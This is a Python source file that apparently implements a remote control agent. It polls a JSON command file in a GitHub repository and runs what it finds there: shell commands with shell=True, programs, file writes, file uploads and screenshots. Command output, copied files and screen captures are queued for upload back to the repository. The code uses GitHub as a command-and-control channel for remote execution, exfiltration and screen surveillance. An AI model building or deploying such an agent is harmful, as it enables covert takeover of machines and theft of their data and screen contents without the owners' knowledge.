import os
import json
import logger
import shutil
import datetime
import subprocess
from github import Github
from PIL import ImageGrab

def fetch_command_json(repo_name, json_file_path, token, log_file_path):
    g = Github(token)
    user = g.get_user()
    repo = user.get_repo(repo_name)
    try:
        file_content = repo.get_contents(json_file_path)
        json_content = file_content.decoded_content.decode('utf-8')
        return json.loads(json_content), file_content.last_modified
    except Exception as e:
        logger.log_message(f"Failed to fetch command JSON file: {e}", log_file_path)
        return None, None

def update_command_json(repo_name, json_file_path, token, commands, log_file_path):
    g = Github(token)
    user = g.get_user()
    repo = user.get_repo(repo_name)
    try:
        file_content = repo.get_contents(json_file_path)
        json_content = json.dumps(commands, ensure_ascii=False, indent=4)
        repo.update_file(
            path=json_file_path,
            message="Update command JSON with execution status",
            content=json_content,
            sha=file_content.sha,
            branch="main"
        )
        logger.log_message("Updated command JSON file with execution status", log_file_path)
    except Exception as e:
        logger.log_message(f"Failed to update command JSON file: {e}", log_file_path)

def execute_command(command, config, log_file_path, upload_queue, repo_path):
    cmd_type = command.get("type")
    content = command.get("content")
    upload_result = command.get("upload_result", False)
    
    if not cmd_type or not content:
        logger.log_message("Invalid command structure", log_file_path)
        return

    try:
        if cmd_type == "write_file":
            file_path = content["path"]
            file_content = content["data"]
            with open(file_path, "w") as file:
                file.write(file_content)
            logger.log_message(f"Written to file {file_path}", log_file_path)

        elif cmd_type == "upload_file":
            file_path = content["path"]
            dest_dir = os.path.join(repo_path, "RemoteExcUpload", datetime.datetime.now().strftime('%Y.%m.%d'))
            os.makedirs(dest_dir, exist_ok=True)
            dest_path = os.path.join(dest_dir, os.path.basename(file_path))
            shutil.copy(file_path, dest_path)
            upload_queue.put(dest_path)
            logger.log_message(f"Copied {file_path} to {dest_path} and added to upload queue", log_file_path)

        elif cmd_type == "run_program":
            program_path = content["path"]
            subprocess.run(program_path, shell=True)
            logger.log_message(f"Executed program {program_path}", log_file_path)

        elif cmd_type == "run_command":
            command_line = content["command"]
            result = subprocess.run(command_line, shell=True, capture_output=True, text=True)
            logger.log_message(f"Executed command {command_line}", log_file_path)
            if upload_result:
                result_file_path = f"command_result_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(result_file_path, "w") as file:
                    file.write(result.stdout)
                dest_dir = os.path.join(repo_path, "RemoteExcUpload", datetime.datetime.now().strftime('%Y.%m.%d'))
                os.makedirs(dest_dir, exist_ok=True)
                dest_path = os.path.join(dest_dir, os.path.basename(result_file_path))
                shutil.copy(result_file_path, dest_path)
                upload_queue.put(dest_path)
                logger.log_message(f"Command result saved to {result_file_path}, copied to {dest_path} and added to upload queue", log_file_path)

        elif cmd_type == "screenshot":
            screenshot_path = content.get("path", os.path.join(config["default_screenshot_path"], f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"))
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            logger.log_message(f"Captured screenshot and saved to {screenshot_path}", log_file_path)
            if upload_result:
                dest_dir = os.path.join(repo_path, "RemoteExcUpload", datetime.datetime.now().strftime('%Y.%m.%d'))
                os.makedirs(dest_dir, exist_ok=True)
                dest_path = os.path.join(dest_dir, os.path.basename(screenshot_path))
                shutil.copy(screenshot_path, dest_path)
                upload_queue.put(dest_path)
                logger.log_message(f"Screenshot copied to {dest_path} and added to upload queue", log_file_path)

        command["executed"] = True
        command["executed_time"] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    except Exception as e:
        logger.log_message(f"Failed to execute command: {e}", log_file_path)


